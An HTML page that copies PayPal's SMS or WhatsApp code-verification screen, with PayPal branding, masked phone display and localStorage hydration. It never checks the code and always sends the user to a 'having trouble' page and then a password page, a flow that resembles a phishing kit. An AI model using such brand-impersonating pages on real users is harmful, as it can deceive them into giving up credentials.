<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Enter the code we texted you</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #f5f7fa;
      color: #111;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
    }

    .page {
      width: 100%;
      max-width: 480px;
      background-color: #fff;
      padding: 40px 24px 32px;
      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
      margin-top: 40px;
      position: relative;
    }

    .status-bar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      background-color: #f5f7fa;
      border-radius: 999px;
      padding: 10px 16px;
      margin-bottom: 32px;
      font-size: 14px;
      color: #111;
    }

    .status-bar-email {
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
      flex: 1 1 auto;
      margin-right: 8px;
      font-size: 15px;
      font-weight: 600;
      color: #111111;
    }

    .status-bar-change {
      font-weight: 700;
      color: #0067F4;
      cursor: pointer;
      flex-shrink: 0;
    }

    .status-pill {
      position: absolute;
      left: 50%;
      top: 20px;
      transform: translateX(-50%);
      padding: 10px 24px;
      background-color: #1D9269;
      color: #fff;
      font-weight: 600;
      border-radius: 999px;
      display: none;
      align-items: center;
      gap: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
      z-index: 10;
    }

    .status-pill.visible { display: flex; }

    .status-pill-check {
      width: 18px;
      height: 18px;
      border-radius: 50%;
      border: 2px solid #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 12px;
      line-height: 1;
    }

    .logo-image {
      width: 56px;
      height: 56px;
      border-radius: 8px;
      display: block;
      margin-bottom: 24px;
      object-fit: cover;
    }

    h1 {
      font-size: 32px;
      line-height: 1.15;
      font-weight: 800;
      margin-bottom: 16px;
      color: #111111;
    }

    .subtitle { font-size: 16px; margin-bottom: 32px; }

    .email {
      font-size: 16px;
      margin-bottom: 24px;
      min-height: 1em;
      color: #111111;
      font-weight: 700;
    }

    .code-inputs {
      display: flex;
      gap: 8px;
      margin-bottom: 4px;
      justify-content: space-between;
    }

    .code-inputs input {
      flex: 1 1 40px;
      max-width: 52px;
      height: 64px;
      border-radius: 10px;
      border: 1px solid #d3d7df;
      font-size: 24px;
      text-align: center;
      outline: none;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
      background-color: #f5f7fa;
    }

    .code-inputs input:focus {
      border-color: #0070ba;
      box-shadow: 0 0 0 1px #0070ba33;
      background-color: #ffffff;
    }

    .resend {
      display: inline-block;
      margin-top: 6px;
      margin-bottom: 72px;
      font-size: 16px;
      font-weight: 700;
      color: #0070BA;
      text-decoration: none;
      cursor: pointer;
    }

    .resend.disabled {
      color: #9ea3aa;
      cursor: default;
      pointer-events: none;
    }

    .resend:hover:not(.disabled) { text-decoration: underline; }

    .primary-btn,
    .secondary-btn {
      width: 100%;
      border-radius: 999px;
      border: none;
      cursor: pointer;
      font-size: 16px;
      font-weight: 600;
      padding: 14px 16px;
      margin-bottom: 16px;
    }

    .primary-btn { background-color: #034FB3; color: #ffffff; }
    .primary-btn:hover { background-color: #02439a; }

    .secondary-btn {
      background-color: #fff;
      color: #003087;
      border: 1px solid #d3d7df;
    }

    .secondary-btn:hover { background-color: #f5f7fa; }

    .footer-links {
      display: flex;
      justify-content: center;
      gap: 24px;
      margin-top: 24px;
      font-size: 13px;
    }

    .footer-links a { color: #545454; text-decoration: underline; }
    .footer-links a:hover { text-decoration: underline; }

    @media (max-width: 480px) {
      .page {
        margin-top: 0;
        min-height: 100vh;
        border-radius: 0;
        box-shadow: none;
      }
      h1 { font-size: 28px; }
    }
  </style>
</head>
<body>
  <main class="page">
    <div class="status-pill" id="sentPill">
      <span class="status-pill-check">✓</span>
      <span>Sent!</span>
    </div>

    <div class="status-bar">
      <span class="status-bar-email" id="headerEmail">example@email.com</span>
      <span class="status-bar-change" id="changeBtn">Change</span>
    </div>

    <img src="img/paypal-logo.jpeg" alt="PayPal logo" class="logo-image" />

    <h1>Enter the code we texted you</h1>
    <p class="subtitle"></p>

    <!-- Default text is formatted so it looks correct even before JS hydration runs -->
    <p class="email" id="userEmail">+1 5••-••••••86</p>

    <form id="codeForm">
      <div class="code-inputs">
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 1" />
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 2" />
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 3" />
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 4" />
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 5" />
        <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="Digit 6" />
      </div>

      <a href="#" class="resend" id="resendLink">Resend</a>

      <button type="submit" class="primary-btn" id="submitBtn">Submit</button>
      <button type="button" class="secondary-btn" id="chooseAnotherBtn">Choose Another Option</button>
    </form>

    <div class="footer-links">
      <a href="#">Contact Us</a>
      <a href="#">Privacy</a>
      <a href="#">Legal</a>
      <a href="#">Worldwide</a>
    </div>
  </main>

  <script>
    (function() {
      const params = new URLSearchParams(window.location.search);
      const headerEmail = document.getElementById('headerEmail');
      const userEmail = document.getElementById('userEmail');
      const subtitle = document.querySelector('.subtitle');
      const titleEl = document.querySelector('h1');
      const changeBtn = document.getElementById('changeBtn');
      const codeForm = document.getElementById('codeForm');
      const chooseAnotherBtn = document.getElementById('chooseAnotherBtn');

      const method = (params.get('method') || 'sms').toLowerCase();
      const phoneKeyFromParam = params.get('phoneKey');

      const storedEmail = localStorage.getItem('pp_email');
      const defaultUser = {
        email: storedEmail || 'example@email.com',
        mobile1: '3xxxxxx86',
        mobile2: '3xxxxxx76'
      };

      function getStorageKey(name){
        const emailKey = (storedEmail || defaultUser.email || 'guest').toLowerCase();
        return 'pp_' + name + '_' + emailKey;
      }

      function safeParse(json) {
        try { return JSON.parse(json); } catch { return null; }
      }

      function extractLast2FromMasked(masked) {
        const m = String(masked || '').match(/(\d{2})\s*$/);
        return m ? m[1] : '';
      }

      // Convert a masked value like "3xxxxxx86" into "+1 5••-••••••86"
      // (format requested for UI display)
      function formatMaskedMobile(masked) {
        const last2 = extractLast2FromMasked(masked) || '';
        return `+1 5••-••••••${last2}`;
      }

      function setHeaderForMethod(){
        if(!titleEl) return;
        if(method === 'wa'){
          titleEl.innerHTML = 'Enter the code we<br>texted you on<br>WhatsApp';
          document.title = 'Enter the code we texted you on WhatsApp';
        } else {
          titleEl.textContent = 'Enter the code we texted you';
          document.title = 'Enter the code we texted you';
        }
      }

      async function ensureUser(emailHint) {
        const storedUser = safeParse(localStorage.getItem('pp_user') || '');
        if (storedUser && storedUser.email) return storedUser;

        try {
          const res = await fetch('users.json', { cache: 'no-store' });
          const data = await res.json();
          const users = Array.isArray(data.users) ? data.users : [];
          const found = emailHint
            ? users.find(u => (u.email || '').toLowerCase() === String(emailHint).toLowerCase())
            : null;
          const user = found || users[0] || null;
          if (user) {
            localStorage.setItem('pp_user', JSON.stringify(user));
            if (user.email) localStorage.setItem('pp_email', user.email);
            if (user.mobile1) localStorage.setItem('pp_mobile', user.mobile1);
            const last2 = extractLast2FromMasked(user.card1) || extractLast2FromMasked(user.card2);
            if (last2) localStorage.setItem('pp_last2', last2);
          }
          return user;
        } catch {
          return storedUser || null;
        }
      }

      // hydrate UI from query/localStorage/users.json
      const emailFromParam = params.get('email');
      const mobileFromParam = params.get('mobile');
      const last2FromParam = params.get('last2');

      if (emailFromParam) localStorage.setItem('pp_email', decodeURIComponent(emailFromParam));
      if (mobileFromParam) localStorage.setItem('pp_mobile', mobileFromParam);
      if (last2FromParam) localStorage.setItem('pp_last2', last2FromParam);

      const email = localStorage.getItem('pp_email') || decodeURIComponent(emailFromParam || '') || 'example@email.com';
      // Determine which phone the user actually selected on verification.html
      const selectionKey = phoneKeyFromParam || localStorage.getItem(getStorageKey(method === 'wa' ? 'waSelection' : 'smsSelection')) || (method === 'wa' ? 'mobile2' : 'mobile1');
      const fallbackMobile = defaultUser[selectionKey] || defaultUser.mobile1;
      const mobile = mobileFromParam || fallbackMobile;

      setHeaderForMethod();
      headerEmail.textContent = email;
      userEmail.textContent = formatMaskedMobile(mobile);
      if (subtitle) subtitle.textContent = '';

      ensureUser(email).then((u) => {
        // If users.json provided mobiles for this email, prefer showing the exact selection.
        const chosen = u && (u[selectionKey] || u.mobile1 || u.mobile2);
        if (chosen) userEmail.textContent = formatMaskedMobile(chosen);
        if (subtitle) subtitle.textContent = '';
      });

      changeBtn.addEventListener('click', () => {
        window.location.href = 'home.html';
      });

      // "Choose Another Option" CTA -> verification.html
      chooseAnotherBtn.addEventListener('click', () => {
        const qs = new URLSearchParams();
        if (email) qs.set('email', email);
        window.location.href = 'verification.html' + (qs.toString() ? ('?' + qs.toString()) : '');
      });

      // Auto-advance code inputs as digits are entered
      const codeInputs = Array.from(document.querySelectorAll('.code-inputs input'));

      function focusInput(idx) {
        const el = codeInputs[idx];
        if (!el) return;
        el.focus();
        el.select();
      }

      codeInputs.forEach((input, idx) => {
        input.addEventListener('input', () => {
          // Keep only the last typed character and only allow digits
          let v = String(input.value || '');
          if (v.length > 1) v = v.slice(-1);
          if (!/\d/.test(v)) v = '';
          input.value = v;
          if (v && idx < codeInputs.length - 1) focusInput(idx + 1);
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !input.value && idx > 0) {
            focusInput(idx - 1);
          }
        });

        input.addEventListener('paste', (e) => {
          const text = (e.clipboardData || window.clipboardData).getData('text') || '';
          const digits = text.replace(/\D/g, '').slice(0, codeInputs.length - idx);
          if (!digits) return;
          e.preventDefault();
          digits.split('').forEach((d, i) => {
            const target = codeInputs[idx + i];
            if (target) target.value = d;
          });
          const nextIndex = Math.min(idx + digits.length, codeInputs.length - 1);
          focusInput(nextIndex);
        });
      });

      // Keep your existing resend behavior
      const resendLink = document.getElementById('resendLink');
      const sentPill = document.getElementById('sentPill');
      const defaultResendText = 'Resend';
      let countdownTimer = null;

      resendLink.addEventListener('click', function (e) {
        e.preventDefault();
        if (resendLink.classList.contains('disabled')) return;

        resendLink.classList.add('disabled');

        let remaining = 5;
        resendLink.textContent = `Resend code in ${remaining} sec`;

        if (countdownTimer) {
          clearInterval(countdownTimer);
          countdownTimer = null;
        }

        countdownTimer = setInterval(() => {
          remaining -= 1;

          if (remaining > 0) {
            resendLink.textContent = `Resend code in ${remaining} sec`;
          } else {
            clearInterval(countdownTimer);
            countdownTimer = null;
            resendLink.textContent = defaultResendText;
            resendLink.classList.remove('disabled');
          }
        }, 1000);

        sentPill.classList.add('visible');
        setTimeout(() => {
          sentPill.classList.remove('visible');
        }, 2000);
      });

      // Submit CTA
      // First attempt -> havingtrouble.html
      // Second attempt (same session) -> enterpassword.html
      codeForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Record what the user tried so verification.html can hide it ONLY after trouble.
        localStorage.setItem(getStorageKey('lastAttempt'), JSON.stringify({ method: method === 'wa' ? 'wa' : 'sms', phoneKey: selectionKey }));

        const k = getStorageKey('attemptCount');
        const prev = parseInt(sessionStorage.getItem(k) || '0', 10) || 0;
        const next = prev + 1;
        sessionStorage.setItem(k, String(next));

        if (prev >= 1) {
          window.location.href = 'enterpassword.html';
        } else {
          window.location.href = 'havingtrouble.html';
        }
      });
    })();
  </script>
</body>
</html>
